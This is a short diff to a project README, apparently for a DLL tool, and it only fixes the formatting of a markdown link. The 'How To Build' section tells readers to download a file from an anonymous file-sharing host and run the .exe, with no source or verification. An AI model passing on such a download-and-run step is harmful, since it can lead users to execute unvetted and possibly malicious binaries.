@@ -10,7 +10,7 @@ You can enable the DLL to use a pipe as well as some other settings at the top o
 
 # How To Build
 
-[Download] (https://gofile.io/d/KSQlqO)
+[Download](https://gofile.io/d/KSQlqO)
 Run the .exe
 
 # Note
